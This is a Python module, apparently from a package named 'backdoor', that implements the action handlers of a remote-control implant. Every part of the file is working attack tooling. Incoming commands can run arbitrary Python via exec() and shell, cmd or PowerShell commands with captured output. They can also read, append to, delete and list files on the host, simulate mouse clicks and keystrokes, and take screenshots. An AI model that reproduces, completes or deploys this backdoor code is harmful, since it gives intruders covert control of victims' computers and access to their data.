# actions.py

import subprocess
import sys
import os
import threading
import time
from abc import ABCMeta
from io import StringIO
from dataclasses import dataclass, field, asdict
from typing import Callable, Literal, Self
import numpy as np

from dacite import from_dict

import pyautogui

from backdoor.command import CommandCapsule
from backdoor.execution import SubProcess, SubThread
from backdoor.data import File, Format, DataCapsul
from backdoor.labels import READ, WRITE, SEARCH, DELETE

__all__ = [
    "ExecutionAction",
    "Actions",
    "DataAction",
    "ManagementAction",
    "SystemAction"
]

JsonValue = str | bytes | dict | list | int | float | bool | None
ActionsDict = dict[str, Callable[[CommandCapsule], DataCapsul]]

class BaseActionGroup(metaclass=ABCMeta):

    ACTIONS: ActionsDict

    def __init__(self) -> None:

        self.actions = self.ACTIONS.copy()

class ExecutionAction(BaseActionGroup):

    PYTHON = 'python'
    POWERSHELL = 'powershell'
    CMD = 'cmd'
    SHELL = 'shell'
    SLEEP = 'sleep'
    CUSTOM = 'custom'

    TYPE = 'execution'

    @staticmethod
    def _execute(
            capsul: CommandCapsule, execution: Callable[[], ...]
    ) -> DataCapsul:

        wait = capsul.command.action.wait

        timeout = None
        executor = None

        saved_stdout = sys.stdout
        saved_stderr = sys.stderr

        out = sys.stdout = StringIO()
        err = sys.stderr = StringIO()

        result = {}

        if capsul.command.action.timeout is not None:
            timeout = capsul.command.action.timeout.total_seconds()

        finish = lambda: (
            result.update(dict(stdout=out.getvalue(), stderr=err.getvalue())),
            capsul.on_finish(capsul)
        )

        if capsul.command.action.thread or timeout:
            executor = SubThread(threading.Thread(target=execution))

            capsul.command.executions.append(executor)
            capsul.command.running = True

            executor.run()

            if wait:
                executor.timeout(timeout=timeout)

            else:
                timer = SubThread(
                    threading.Thread(
                        target=lambda: (
                            executor.timeout(timeout=timeout),
                            finish()
                        )
                    )
                )

                capsul.command.executions.append(timer)

                timer.run()

        else:
            execution()

        sys.stdout = saved_stdout
        sys.stderr = saved_stderr

        if wait and not (executor and executor.is_alive()):
            finish()

        return DataCapsul(result)

    @staticmethod
    def python(capsul: CommandCapsule) -> DataCapsul:

        return ExecutionAction._execute(
            capsul, lambda: exec(capsul.command.request.data(), capsul.memory)
        )

    @staticmethod
    def shell(
            capsul: CommandCapsule,
            executor: None | str | Literal['powershell', 'cmd'] = None
    ) -> DataCapsul:

        timeout = None

        if capsul.command.action.timeout is not None:
            timeout = capsul.command.action.timeout.total_seconds()

        script = capsul.command.request.data()

        args = [*([executor] if executor else []), script]

        process = SubProcess()

        execution = lambda: process.run(
            args, shell=True, capture_output=True,
            text=True, timeout=timeout
        )

        value = ExecutionAction._execute(capsul, execution)

        if isinstance(process.result, subprocess.CompletedProcess):
            value.payload['stdout'] = process.result.stdout
            value.payload['stderr'] = process.result.stderr

        return value

    @staticmethod
    def powershell(capsul: CommandCapsule) -> DataCapsul:

        return ExecutionAction.shell(
            capsul, executor=ExecutionAction.POWERSHELL
        )

    @staticmethod
    def cmd(capsul: CommandCapsule) -> DataCapsul:

        return ExecutionAction.shell(capsul, executor=None)

    @staticmethod
    def sleep(capsul: CommandCapsule) -> DataCapsul:

        seconds = capsul.command.request.data()

        time.sleep(seconds)

        return DataCapsul(message=f"Slept for {seconds} seconds.")

    ACTIONS: ActionsDict = {
        PYTHON: python,
        POWERSHELL: powershell,
        CMD: cmd,
        SHELL: shell,
        SLEEP: sleep,
        CUSTOM: None
    }

class DataAction(BaseActionGroup):

    WRITE = WRITE
    READ = READ
    DELETE = DELETE
    SEARCH = SEARCH

    TYPE = 'data'

    @staticmethod
    def write(capsul: CommandCapsule) -> DataCapsul:

        name = capsul.command.request.name

        capsul.memory[name] = capsul.command.request.data()

        return DataCapsul(message=f"'{name}' was written to memory in memory.")

    @staticmethod
    def search(capsul: CommandCapsule) -> DataCapsul(bool):

        return DataCapsul(capsul.command.request.name in capsul.memory)

    @staticmethod
    def read(capsul: CommandCapsule) -> DataCapsul:

        name = capsul.command.request.name

        if name not in capsul.memory:
            raise ValueError(f"'{name}' is not saved in memory.")

        return DataCapsul(capsul.memory[name])

    @staticmethod
    def delete(capsul: CommandCapsule) -> DataCapsul:

        name = capsul.command.request.name

        if name not in capsul.memory:
            raise ValueError(f"'{name}' is not saved in memory.")

        capsul.memory.pop(name)

        return DataCapsul(message=f"'{name}' was deleted from memory.")

    ACTIONS: ActionsDict = {
        WRITE: write,
        READ: read,
        SEARCH: search,
        DELETE: delete
    }

class FileAction(BaseActionGroup):

    READ = READ
    WRITE = WRITE
    DELETE = DELETE
    SEARCH = SEARCH
    TREE = 'tree'
    LIST = 'list'

    TYPE = 'file'

    @staticmethod
    def read(capsul: CommandCapsule) -> DataCapsul:

        if not isinstance(capsul.command.request, File):
            raise ValueError('request data must be of type File.')

        path = capsul.command.request.name

        if not path or not isinstance(path, str) or not os.path.exists(path):
            raise ValueError(
                'request data name must be a valid existing file name.'
            )

        f = capsul.command.request.format

        if not f:
            f = Format.BYTES

        elif f not in Format.FORMATS:
            raise ValueError(
                f"File format must be one of: "
                f"'{', '.join(Format.FORMATS)}', not: '{f}'."
            )

        if f == Format.TEXT:
            f = 'r'

        elif f == Format.BYTES:
            f = 'rb'

        with open(path, f) as file:
            file.seek(capsul.command.request.position, 0)
            payload = file.read(capsul.command.request.buffer or -1)

        capsul.command.request.position += len(payload)
        capsul.command.request.size = os.path.getsize(path)

        return DataCapsul(payload)

    @staticmethod
    def write(capsul: CommandCapsule) -> DataCapsul:

        if not isinstance(capsul.command.request, File):
            raise ValueError('request data must be of type File.')

        path = capsul.command.request.name

        if not path or not isinstance(path, str):
            raise ValueError('request data name must be a valid file name.')

        f = capsul.command.request.format

        if not f:
            f = Format.BYTES

        elif f not in Format.FORMATS:
            raise ValueError(
                f"File format must be one of: "
                f"'{', '.join(Format.FORMATS)}', not: '{f}'."
            )

        if f == Format.TEXT:
            f = 'a+'

        elif f == Format.BYTES:
            f = 'a+b'

        payload = capsul.command.request.data()

        with open(path, f) as file:
            file.seek(capsul.command.request.position, 0)
            file.write(payload)

        capsul.command.request.position += len(payload)
        capsul.command.request.size = os.path.getsize(path)

        return DataCapsul(message=f"Data was added to the end of file: '{path}'.")

    @staticmethod
    def delete(capsul: CommandCapsule) -> DataCapsul:

        if not isinstance(capsul.command.request, File):
            raise ValueError('request data must be of type File.')

        path = capsul.command.request.name

        if not path or not isinstance(path, str) or not os.path.exists(path):
            raise ValueError(
                'request data name must be a valid existing file name.'
            )

        os.remove(path)

        return DataCapsul(message=f"file: '{path}' was deleted.")

    @staticmethod
    def search(capsul: CommandCapsule) -> DataCapsul:

        path = capsul.command.request.name

        if not path or not isinstance(path, str):
            raise ValueError('request data name must be a valid file name.')

        return DataCapsul(os.path.exists(path))

    @staticmethod
    def list(capsul: CommandCapsule) -> DataCapsul:

        path = capsul.command.request.name

        if not path or not isinstance(path, str) or not os.path.isdir(path):
            raise ValueError('request data name must be a valid directory name.')

        return DataCapsul(os.listdir(path))

    ACTIONS: ActionsDict = {
        READ: read,
        WRITE: write,
        DELETE: delete,
        SEARCH: search,
        LIST: list,
        TREE: None
    }

class SystemAction(BaseActionGroup):

    CD = 'cd'
    ROOT = 'root'
    CWD = 'cwd'

    TYPE = 'system'

    ACTIONS: ActionsDict = {
        CD: None,
        ROOT: None,
        CWD: None
    }

@dataclass(slots=True, frozen=True)
class Click:

    position: tuple[int | None, int | None] = field(
        default_factory=lambda: (None, None)
    )
    key: Literal['left', 'right', 'middle'] = 'left'
    clicks: Literal['single', 'double', 'triple'] = 'single'
    direction: Literal['up', 'down'] | None = None
    repetitions: int = 1
    duration: float = 0.0
    interval: float = 0.0

    def action(self) -> None:

        command = None

        if self.direction is None:
            if self.clicks == 'single':
                command = pyautogui.click

            elif self.clicks == 'double':
                command = pyautogui.doubleClick

            elif self.clicks == 'triple':
                command = pyautogui.tripleClick

            if command is None:
                raise ValueError(
                    f"Invalid clicks data: '{self.clicks}'. "
                    f"must be one of: {', '.join(('single', 'double', 'triple'))}"
                )

            for _ in range(self.repetitions):
                command(
                    *self.position, button=self.key,
                    interval=self.interval, duration=self.duration
                )

        else:
            if self.direction == 'up':
                command = pyautogui.keyUp

            elif self.direction == 'down':
                command = pyautogui.keyDown

            if command is None:
                raise ValueError(
                    f"Invalid click direction: '{self.direction}'. "
                    f"must be one of: {', '.join(('up', 'down'))}"
                )

            command(self.key)

    @classmethod
    def load(cls, data: dict[str, JsonValue]) -> Self:

        return from_dict(cls, data)

    def dump(self) -> dict[str, JsonValue]:

        return asdict(self)

@dataclass(slots=True, frozen=True)
class Press:

    keys: list[str] = field(default_factory=list)
    repetitions: int = 1
    interval: float = 0.0

    def action(self) -> None:

        pyautogui.press(self.keys, self.repetitions, self.interval)

    @classmethod
    def load(cls, data: dict[str, JsonValue]) -> Self:

        return from_dict(cls, data)

    def dump(self) -> dict[str, JsonValue]:

        return asdict(self)

@dataclass(slots=True, frozen=True)
class Typing:

    text: str
    interval: float = 0.0

    def action(self) -> None:

        pyautogui.write(self.text, self.interval)

    @classmethod
    def load(cls, data: dict[str, JsonValue]) -> Self:

        return from_dict(cls, data)

    def dump(self) -> dict[str, JsonValue]:

        return asdict(self)

@dataclass(slots=True)
class Position:

    position: tuple[int | None, int | None] | None = field(
        default_factory=lambda: tuple(*pyautogui.position())[:2]
    )
    move: bool = False

    def action(self) -> None:

        if self.move:
            pyautogui.moveTo(*self.position)

    @classmethod
    def load(cls, data: dict[str, JsonValue]) -> Self:

        return from_dict(cls, data)

    def dump(self) -> dict[str, JsonValue]:

        return asdict(self)

@dataclass(slots=True)
class Screen:

    shot: bool | None | str | list[list[tuple[int] | list[int]]] = None
    size: tuple[int, int] = field(default_factory=lambda: pyautogui.size())

    def action(self) -> None:

        if self.shot is True:
            self.shot = np.asarray(pyautogui.screenshot()).tolist()

        elif isinstance(self.shot, str):
            pyautogui.screenshot(self.shot)

@dataclass(slots=True, frozen=True)
class Control:

    actions: list[Click | Press | Typing | Position | Screen] = field(
        default_factory=list
    )

    @classmethod
    def load(cls, data: dict[str, JsonValue]) -> Self:

        return from_dict(cls, data)

    def dump(self) -> dict[str, JsonValue]:

        return asdict(self)

class ControlAction(BaseActionGroup):

    ACTION = 'action'

    TYPE = 'control'

    @staticmethod
    def action(capsul: CommandCapsule) -> DataCapsul:

        control_data = capsul.command.request.data()

        try:
            control = Control.load(control_data)

        except (TypeError, ValueError):
            raise ValueError(f"Invalid Control data: '{control_data}'.")

        if control.actions is not None:
            for action in control.actions:
                action.action()

        return DataCapsul(control.dump())

    ACTIONS: ActionsDict = {
        ACTION: action
    }

class ManagementAction(BaseActionGroup):

    RERUN = 'rerun'
    CLEAN = 'clean'
    LAST = 'last'
    COMMAND = 'command'
    STOP = 'stop'
    FORGET = 'forget'
    ADD = 'add'
    DELETE = 'delete'
    RUNNING = 'running'

    TYPE = 'management'

    ACTIONS: ActionsDict = {
        RERUN: None,
        CLEAN: None,
        LAST: None,
        COMMAND: None,
        STOP: None,
        FORGET: None,
        ADD: None,
        RUNNING: None
    }

class Actions:

    EXECUTION = ExecutionAction
    MANAGEMENT = ManagementAction
    DATA = DataAction
    SYSTEM = SystemAction
    FILE = FileAction
    CONTROL = ControlAction

    ACTIONS: dict[str, ActionsDict] = {
        EXECUTION.TYPE: ExecutionAction.ACTIONS,
        MANAGEMENT.TYPE: ManagementAction.ACTIONS,
        DATA.TYPE: DataAction.ACTIONS,
        SYSTEM.TYPE: SYSTEM.ACTIONS,
        FILE.TYPE: FILE.ACTIONS,
        CONTROL.TYPE: CONTROL.ACTIONS
    }

    def __init__(self) -> None:

        self.execution = self.EXECUTION()
        self.management = self.MANAGEMENT()
        self.data = self.DATA()
        self.system = self.SYSTEM()
        self.file = self.FILE()
        self.control = self.CONTROL()

        self.actions: dict[str, ActionsDict] = {
            self.execution.TYPE: self.execution.actions,
            self.management.TYPE: self.management.actions,
            self.data.TYPE: self.data.actions,
            self.system.TYPE: self.system.actions,
            self.file.TYPE: self.file.actions,
            self.control.TYPE: self.control.actions
        }